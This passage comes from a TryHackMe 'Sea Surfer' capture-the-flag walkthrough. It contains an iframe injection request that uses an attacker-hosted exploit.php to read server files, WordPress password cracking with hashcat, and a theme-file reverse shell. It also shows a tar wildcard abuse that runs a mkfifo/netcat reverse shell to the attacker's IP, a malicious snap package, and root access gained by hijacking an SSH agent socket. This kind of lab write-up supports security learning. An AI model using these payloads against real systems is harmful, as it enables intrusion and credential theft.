GET /output.php?name=sugo2&payment=Credit+card&comment=%22%3E%3Ciframe+height%3D%222000%22+width%3D%22800%22+src%3Dhttp%3A%2F%2F10.8.100.14%3A9001%2Fexploit.php%3Furl%3D%252Foutput%252Ephp%3E%3C%2Fiframe%3E&item1=3&price1=1 HTTP/1.1
Host: internal.seasurfer.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://internal.seasurfer.thm/
Upgrade-Insecure-Requests: 1
```

`/etc/apache2/sites-enabled/000-default.conf`

![](Pasted%20image%2020230806160224.png)

(educated guess) `/etc/apache2/sites-enabled/internal.conf`

![](Pasted%20image%2020230806160637.png)

### wp-config

At this point, we would like to read `wp-config.php` (related to previous vhost: http://seasurfer.thm)

After LOTS of tries, we finally reach that file!

`/var/www/wordpress/wp-config.php`

`%2Fvar%2Fwww%2Fwordpress%2Fwp%2Dconfig%2Ephp`


![](Pasted%20image%2020230806165103.png)

We try to access with SSH but...

```bash
$ ssh kyle@seasurfer.thm
The authenticity of host 'seasurfer.thm (10.10.123.59)' can't be established.
ED25519 key fingerprint is SHA256:4ChmQCQ0tIG/wbF2YLD8+ZdmJVvA1bFzIRVLwXXrs0g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'seasurfer.thm' (ED25519) to the list of known hosts.
kyle@seasurfer.thm: Permission denied (publickey).
```

We then need to find public ssh key of user `kyle`

Let's focus again with `seasurfer.thm` vhost.

Since we previously tried to use `big.txt` wordlist, let's run same attack on that vhost.

```bash
joshua@kaligra:/opt/SecLists/Discovery/Web-Content$ feroxbuster --silent -u http://seasurfer.thm -t 20 -L 1 -w /opt/SecLists/Discovery/Web-Content/big.txt
http://seasurfer.thm/.htaccess
http://seasurfer.thm/
http://seasurfer.thm/! => http://seasurfer.thm/
http://seasurfer.thm/0 => http://seasurfer.thm/
http://seasurfer.thm/0000 => http://seasurfer.thm/0000/
http://seasurfer.thm/.htpasswd
http://seasurfer.thm/A => http://seasurfer.thm/
http://seasurfer.thm/About => http://seasurfer.thm/
http://seasurfer.thm/B => http://seasurfer.thm/blog/
http://seasurfer.thm/Blog => http://seasurfer.thm/Blog/
http://seasurfer.thm/C => http://seasurfer.thm/contact/
http://seasurfer.thm/Contact => http://seasurfer.thm/Contact/
http://seasurfer.thm/H => http://seasurfer.thm/home/
http://seasurfer.thm/Home => http://seasurfer.thm/Home/
http://seasurfer.thm/News => http://seasurfer.thm/News/
http://seasurfer.thm/N => http://seasurfer.thm/new-website-is-up/
http://seasurfer.thm/S => http://seasurfer.thm/sale/
http://seasurfer.thm/a => http://seasurfer.thm/
http://seasurfer.thm/ab => http://seasurfer.thm/
http://seasurfer.thm/abo => http://seasurfer.thm/
http://seasurfer.thm/about => http://seasurfer.thm/
http://seasurfer.thm/admin => http://seasurfer.thm/wp-admin/
http://seasurfer.thm/adminer => http://seasurfer.thm/adminer/ <===
```

We found `/adminer`!!!

Let's log in with credentials founded in `wp-config.php`

![](Pasted%20image%2020230806165735.png)

Of course, we look at `wp_users` table:

![](Pasted%20image%2020230806165815.png)

Let's try to crack:

```bash
$ hashcat -m 400 '$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/' /usr/share/wordlists/rockyou.txt
..
..
..
$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/:jenny4XXXX

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/
Time.Started.....: Sun Aug  6 16:59:57 2023 (4 mins, 5 secs)
Time.Estimated...: Sun Aug  6 17:04:02 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2045 H/s (7.87ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 501376/14344385 (3.50%)
Rejected.........: 0/501376 (0.00%)
Restore.Point....: 501248/14344385 (3.49%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7168-8192
Candidate.Engine.: Device Generator
Candidates.#1....: jeremy1997 -> jenna44
Hardware.Mon.#1..: Util: 97%

Started: Sun Aug  6 16:59:12 2023
Stopped: Sun Aug  6 17:04:04 2023
```

### WP backend

We are in Wordpress backend.

![](Pasted%20image%2020230806170515.png)


We change the `functions.php` file through "Theme File Editor":

![](Pasted%20image%2020230806212654.png)


We spawn a netcat listener, and we receive our shell:

```bash
joshua@kaligra:~/Documents/thm/sea_surfer$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.22.138] 36994
Linux seasurfer 5.4.0-107-generic #121-Ubuntu SMP Thu Mar 24 16:04:27 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 17:08:35 up 3 min,  1 user,  load average: 0.28, 0.44, 0.20
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

We can't access `kyle`'s  home:

```bash
www-data@seasurfer:/home$ ls kyle
ls: cannot open directory 'kyle': Permission denied
```

We enumerate file owned by `kyle`:

```bash
$ find / -type f -user kyle 2>/dev/null
..
..
/var/www/internal/sunset.jpg
/var/www/internal/maintenance/backup.sh
/var/www/internal/.htaccess
/var/www/internal/invoice.php
/var/www/internal/cartoonsurfer.png
..
..
```

### backup script

```bash
www-data@seasurfer:/var/www/internal/maintenance$ cat backup.sh
#!/bin/bash

# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
# Still need to come up with a better backup system, perhaps a cloud provider?

cd /var/www/internal/invoices
tar -zcf /home/kyle/backups/invoices.tgz *
```

### tar wildcard abuse

```bash
$ cd /var/www/internal/invoices
$ echo "mkfifo /tmp/lhennp; nc 10.8.100.14 6666 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
$ echo "" > "--checkpoint-action=exec=sh shell.sh"
$ echo "" > --checkpoint=1
```


Spawn local netcat listener:

```bash
joshua@kaligra:/opt/SecLists/Discovery/Web-Content$ nc -nvlp 6666
listening on [any] 6666 ...
```
## user flag

```bash
connect to [10.8.100.14] from (UNKNOWN) [10.10.22.138] 36106
id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),4(adm),24(cdrom),27(sudo),30(dip),33(www-data),46(plugdev)
pwd
/var/www/internal/invoices
cd /home/kyle
cd .ssh
ls -la
total 12
drwx------ 2 kyle kyle 4096 Apr 17  2022 .
drwxr-x--- 7 kyle kyle 4096 Apr 22  2022 ..
-rw------- 1 kyle kyle  568 Apr 17  2022 authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCtBFOcOYPyroXT89k6kqrP1gPBKZ/29utGW9QkJ9fI9ExhH/6wOtAcVkpAKn2Q3Mq96j8WO8qPOByb9o67pn2NXvoru3tOl8fsjsO1QJRchPdhNnZy59H5ssWm/uoi/RtfPbprld7QEc3VQlM+N6A8ocAUfY/6ELlnIGBNugTogKDLKP7y78mNCXODZoejuP11pWXrTawe9rm7fBSSjVFQngxS5ziMloTwyXxhNrRjK9C3Xlbqap8p+kYu7Ttqeaa5jrKg7HPvZ5E/Hn9nHnSA8Tl6wMWAAIMVKljoyFkQ494ehqORTK3UG6d3Wtz4DZacw9nH8Hs6cajEMKS7JucPIrBePBfdmLcIdzEs+vPWsMd6DZVLVNcU6FYLXwhAPSL6YyU4XIVF40E2f1waBHhdivxc0DkDCfJLObMGAbcnmeVUIj67fMrvmB0clK+3qvWqhw+L2JoOoOHqd03Q5jEZ0nwDLE1Tdr6Yn0JWjvotq57HSDkvyeUuF6AgxIHR/os= kyle@seasurfer
python3 -c 'import pty;pty.spawn("/bin/bash");'
kyle@seasurfer:~/.ssh$

kyle@seasurfer:~/.ssh$

kyle@seasurfer:~/.ssh$ cd
cd
kyle@seasurfer:~$ ls
ls
backups  snap  user.txt
kyle@seasurfer:~$ cat user.txt
cat user.txt
THM{SSRFING_TO_XXXXXXX}
```

Generate ssh keypairs:


```bash
$ ssh-keygen  -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/joshua/.ssh/id_rsa): ./id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:sS5G+dLqeh5qNIM+MyvCQ/+Q8FI/zcvoR8WUoVY5X8I joshua@kaligra
```


```
joshua@kaligra:~/Documents/thm/sea_surfer$ ssh -i id_rsa kyle@seasurfer.thm

  ___ ___   _     ___ _   _ ___ ___ ___ ___
 / __| __| /_\   / __| | | | _ \ __| __| _ \
 \__ \ _| / _ \  \__ \ |_| |   / _|| _||   /
 |___/___/_/ \_\ |___/\___/|_|_\_| |___|_|_\


Last login: Sun Aug  6 17:06:50 2023 from 127.0.0.1
kyle@seasurfer:~$
```

## privesc


### LinPeas

```bash
kyle@seasurfer:~$ chmod +x linpeas.sh
kyle@seasurfer:~$ ./linpeas.sh
..
..
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.31
..
..
Jun 14 23:45:46 seasurfer systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
Jun 14 23:46:46 seasurfer sudo:     kyle : TTY=pts/0 ; PWD=/home/kyle ; USER=root ; COMMAND=/root/admincheck
    password: $6$hq600HkLbsAiSVHZ$/6GmaV6.y4iVS.OM9AI.O5OVQxq1y/C1A6AX4t9uFLyNzaIr/50cRFqLZCYsAwfQvrgQKdZPnOnyEbgzw7RhV/
```

Currently we don't have `kyle`'s password, so `sudo` is not an option.

### hashcat

Let's try to crack that hash:

```bash
D:\tmrc\tools\hashcat-6.2.6>hashcat -m 1800 "$6$hq600HkLbsAiSVHZ$/6GmaV6.y4iVS.OM9AI.O5OVQxq1y/C1A6AX4t9uFLyNzaIr/50cRFqLZCYsAwfQvrgQKdZPnOnyEbgzw7RhV/" d:\tmrc\hacking\wordlist\rockyou.txt
..
..
..
hashcat (v6.2.6) starting
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$hq600HkLbsAiSVHZ$/6GmaV6.y4iVS.OM9AI.O5OVQxq1y/C...w7RhV/
Time.Started.....: Mon Aug 07 14:38:38 2023 (47 mins, 19 secs)
Time.Estimated...: Mon Aug 07 15:25:57 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (d:\tmrc\hacking\wordlist\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5008 H/s (2.86ms) @ Accel:32 Loops:128 Thr:64 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[042a0337c2a156616d6f732103] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 58c Fan: 51% Util: 94% Core:1071MHz Mem:2700MHz Bus:16

Started: Mon Aug 07 14:38:13 2023
Stopped: Mon Aug 07 15:25:58 2023
..
..
```

No luck.

### snap 

Should we focus on `snap`?

```bash
kyle@seasurfer:~$ snap list
Name    Version        Rev    Tracking       Publisher   Notes
core20  20220527       1518   latest/stable  canonical✓  base
lxd     4.0.9-8e2046b  22753  4.0/stable/…   canonical✓  -
snapd   2.56           16010  latest/stable  canonical✓  snapd
```

https://gtfobins.github.io/gtfobins/snap/

Let's install `fpm` on out attacker machine:

https://fpm.readthedocs.io/en/latest/installation.html

```bash
root@kaligra:~# gem install fpm
Fetching stud-0.0.23.gem
Fetching mustache-0.99.8.gem
Fetching insist-1.0.0.gem
Fetching clamp-1.0.1.gem
Fetching cabin-0.9.0.gem
Fetching dotenv-2.8.1.gem
Fetching pleaserun-0.0.32.gem
Fetching backports-3.24.1.gem
Fetching fpm-1.15.1.gem
Fetching arr-pm-0.0.12.gem
Successfully installed stud-0.0.23
Successfully installed mustache-0.99.8
Successfully installed insist-1.0.0
Successfully installed dotenv-2.8.1
Successfully installed clamp-1.0.1
..
..
..
Parsing documentation for fpm-1.15.1
Installing ri documentation for fpm-1.15.1
Done installing documentation for stud, mustache, insist, dotenv, clamp, cabin, pleaserun, backports, arr-pm, fpm after 11 seconds
10 gems installed
```

Let's create our malicious snap package:

```bash
joshua@kaligra:~/Documents/thm/sea_surfer$ COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
Created package {:path=>"xxxx_1.0_all.snap"}
```



```bash
--2023-08-07 14:01:13--  http://10.8.100.14:8080/xxxx_1.0_all.snap
Connecting to 10.8.100.14:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4096 (4.0K) [application/octet-stream]
Saving to: ‘xxxx_1.0_all.snap’

xxxx_1.0_all.snap   100%[===================>]   4.00K  --.-KB/s    in 0.004s

2023-08-07 14:01:13 (1.02 MB/s) - ‘xxxx_1.0_all.snap’ saved [4096/4096]
```

```bash
kyle@seasurfer:~$ sudo snap install xxxx_1.0_all.snap --dangerous --devmode
[sudo] password for kyle:
Sorry, try again.
```

...such unfortunate :(

```bash
kyle@seasurfer:~$ snap services
Service       Startup  Current   Notes
lxd.activate  enabled  inactive  -
lxd.daemon    enabled  inactive  socket-activated
```



We give up :)

https://github.com/lassidev/writeups/blob/main/TryHackMe/Sea%20Surfer.md

```bash
kyle@seasurfer:/tmp$ ls ssh-ZFlYy77InG
agent.1138
kyle@seasurfer:/tmp$  export SSH_AUTH_SOCK=/tmp/ssh-ZFlYy77InG/agent.1138
kyle@seasurfer:/tmp$ sudo -l
Matching Defaults entries for kyle on seasurfer:
    env_keep+=SSH_AUTH_SOCK, env_reset, timestamp_timeout=420, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kyle may run the following commands on seasurfer:
    (ALL : ALL) ALL
kyle@seasurfer:/tmp$ sudo bash
root@seasurfer:/tmp# cd
root@seasurfer:~# id
uid=0(root) gid=0(root) groups=0(root)
root@seasurfer:~# cat to  ro
ca: command not found
root@seasurfer:~# cat root.txt
THM{STEALING_XXXXXXXXXXXXX}
```

